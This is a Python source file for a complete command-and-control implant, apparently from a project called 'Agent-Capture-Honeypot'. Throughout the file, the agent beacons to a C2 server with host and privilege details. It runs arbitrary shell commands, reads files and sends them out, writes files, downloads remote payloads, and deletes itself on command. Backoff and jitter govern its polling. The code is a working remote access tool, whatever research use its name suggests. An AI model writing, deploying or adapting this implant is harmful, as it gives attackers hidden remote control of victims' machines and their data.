#!/usr/bin/env python3
"""
Agent-Capture-Honeypot C2 Implant

Lightweight Python agent that:
1. Registers with the C2 server on first run
2. Polls for commands at configurable intervals
3. Executes shell commands, reads/writes files
4. Reports results back to the C2 server
5. Self-deletes on "uninstall" command

Usage:
    python c2_agent.py --server http://<c2_host>:<port> [--interval 5]

Config is embedded at build time by c2_agent_builder.py.
"""

import json
import os
import platform
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from urllib.request import Request, urlopen

_CONFIG = {
    "c2_server": "http://127.0.0.1:4877",
    "agent_id": "",
    "poll_interval": 5,
    "max_poll_interval": 300,
    "jitter": 0.2,
    "registration_token": "",
}


def _load_config():
    config_path = Path(__file__).with_suffix(".conf")
    if config_path.exists():
        try:
            with open(config_path) as f:
                _CONFIG.update(json.load(f))
        except Exception:
            pass
    for i, arg in enumerate(sys.argv):
        if arg == "--server" and i + 1 < len(sys.argv):
            _CONFIG["c2_server"] = sys.argv[i + 1]
        if arg == "--interval" and i + 1 < len(sys.argv):
            _CONFIG["poll_interval"] = int(sys.argv[i + 1])


def _post_json(url, data, timeout=10):
    headers = {"Content-Type": "application/json", "User-Agent": "ACH-Implant/1.0"}
    if _CONFIG.get("registration_token"):
        headers["X-Client-Token"] = _CONFIG["registration_token"]
    req = Request(
        url,
        data=json.dumps(data).encode("utf-8"),
        headers=headers,
    )
    with urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def _get_json(url, timeout=10):
    req = Request(url, headers={"User-Agent": "ACH-Implant/1.0"})
    with urlopen(req, timeout=timeout) as resp:
        return json.loads(resp.read().decode("utf-8"))


def _collect_system_info():
    info = {
        "hostname": platform.node(),
        "os_name": platform.system(),
        "os_version": platform.release(),
        "username": os.environ.get("USER") or os.environ.get("USERNAME") or "unknown",
        "arch": platform.machine(),
    }
    try:
        info["privileges"] = "root" if os.geteuid() == 0 else "user"
    except Exception:
        info["privileges"] = "unknown"
    return info


def _execute_command(cmd, timeout=60):
    try:
        proc = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            timeout=timeout,
            cwd=tempfile.gettempdir(),
        )
        return {
            "stdout": proc.stdout[:65536],
            "stderr": proc.stderr[:65536],
            "returncode": proc.returncode,
        }
    except subprocess.TimeoutExpired:
        return {"stdout": "", "stderr": "Command timed out", "returncode": -1}
    except Exception as e:
        return {"stdout": "", "stderr": str(e), "returncode": -1}


def _read_file(path):
    try:
        p = Path(path)
        if not p.exists():
            return {"error": "file not found", "content": ""}
        if p.stat().st_size > 10 * 1024 * 1024:
            return {"error": "file too large (>10MB)", "content": ""}
        content = p.read_text(errors="replace")
        return {"content": content[:1048576], "size": p.stat().st_size, "path": str(p)}
    except Exception as e:
        return {"error": str(e), "content": ""}


def _write_file(path, content):
    try:
        p = Path(path)
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
        return {"success": True, "path": str(p), "size": p.stat().st_size}
    except Exception as e:
        return {"success": False, "error": str(e)}


def _execute_task(task):
    task_id = task["id"]
    task_type = task.get("task_type", "cmd")
    cmd = task.get("command", "")
    args = task.get("arguments_json", {}) or {}

    if task_type == "cmd":
        result = _execute_command(cmd)
        return {
            "task_id": task_id,
            "status": "completed",
            "output": f"STDOUT:\n{result['stdout']}\nSTDERR:\n{result['stderr']}\nRC: {result['returncode']}",
            "result": result,
        }

    if task_type == "read_file":
        path = args.get("path", cmd)
        result = _read_file(path)
        return {
            "task_id": task_id,
            "status": "completed",
            "output": result.get("content", result.get("error", "")),
            "result": result,
        }

    if task_type == "write_file":
        path = args.get("path", cmd)
        content = args.get("content", "")
        result = _write_file(path, content)
        return {
            "task_id": task_id,
            "status": "completed" if result.get("success") else "failed",
            "output": f"Written: {result.get('path', '')} ({result.get('size', 0)} bytes)" if result.get("success") else result.get("error", ""),
            "result": result,
        }

    if task_type == "download":
        url = args.get("url", cmd)
        dest = args.get("dest", "/tmp/downloaded_file")
        try:
            req = Request(url, headers={"User-Agent": "ACH-Implant/1.0"})
            with urlopen(req, timeout=60) as resp:
                data = resp.read()
            Path(dest).parent.mkdir(parents=True, exist_ok=True)
            Path(dest).write_bytes(data)
            return {
                "task_id": task_id,
                "status": "completed",
                "output": f"Downloaded {len(data)} bytes to {dest}",
                "result": {"success": True, "path": dest, "size": len(data)},
            }
        except Exception as e:
            return {
                "task_id": task_id,
                "status": "failed",
                "output": str(e),
                "result": {"success": False, "error": str(e)},
            }

    if task_type == "uninstall":
        try:
            agent_file = Path(__file__)
            conf_file = agent_file.with_suffix(".conf")
            if conf_file.exists():
                conf_file.unlink()
            agent_file.unlink(missing_ok=True)
        except Exception:
            pass
        return {
            "task_id": task_id,
            "status": "completed",
            "output": "Uninstalled successfully",
            "result": {"uninstalled": True},
        }

    return {
        "task_id": task_id,
        "status": "failed",
        "output": f"Unknown task type: {task_type}",
        "result": {},
    }


def _send_results(server_url, results):
    for r in results:
        try:
            _post_json(f"{server_url}/c2/tasks/{r['task_id']}/result", r)
        except Exception:
            pass


def _heartbeat(server_url, sys_info, results):
    payload = {
        **sys_info,
        "agent_id": _CONFIG["agent_id"],
        "registration_token": _CONFIG.get("registration_token", ""),
        "results": results,
    }
    try:
        resp = _post_json(f"{server_url}/c2/heartbeat", payload)
        if resp.get("agent_id"):
            _CONFIG["agent_id"] = resp["agent_id"]
            _save_config()
        if resp.get("poll_interval"):
            _CONFIG["poll_interval"] = resp["poll_interval"]
        return resp
    except Exception:
        return {"status": "error"}


def _save_config():
    try:
        config_path = Path(__file__).with_suffix(".conf")
        config_path.write_text(json.dumps(_CONFIG))
    except Exception:
        pass


def main():
    _load_config()
    server_url = _CONFIG["c2_server"].rstrip("/")
    sys_info = _collect_system_info()

    resp = _heartbeat(server_url, sys_info, [])
    _save_config()

    backoff = _CONFIG["poll_interval"]

    while True:
        # Prefer the task delivered inline with the last heartbeat (merged
        # roundtrip); fall back to a dedicated poll when none was attached.
        task = resp.get("next_task") if isinstance(resp, dict) else None
        if not task:
            try:
                result = _post_json(
                    f"{server_url}/c2/tasks/poll",
                    {"agent_id": _CONFIG["agent_id"]},
                )
            except Exception:
                time.sleep(backoff)
                backoff = min(backoff * 2, _CONFIG["max_poll_interval"])
                continue
            task = result.get("task") if result.get("status") == "ok" else None

        backoff = _CONFIG["poll_interval"]

        if task:
            task_result = _execute_task(task)
            _send_results(server_url, [task_result])

        sys_info = _collect_system_info()
        resp = _heartbeat(server_url, sys_info, [])

        if task and task.get("task_type") == "uninstall":
            return

        jitter = 1.0 + _CONFIG["jitter"] * (hash(time.time()) % 100) / 100.0
        time.sleep(backoff * jitter)


if __name__ == "__main__":
    main()
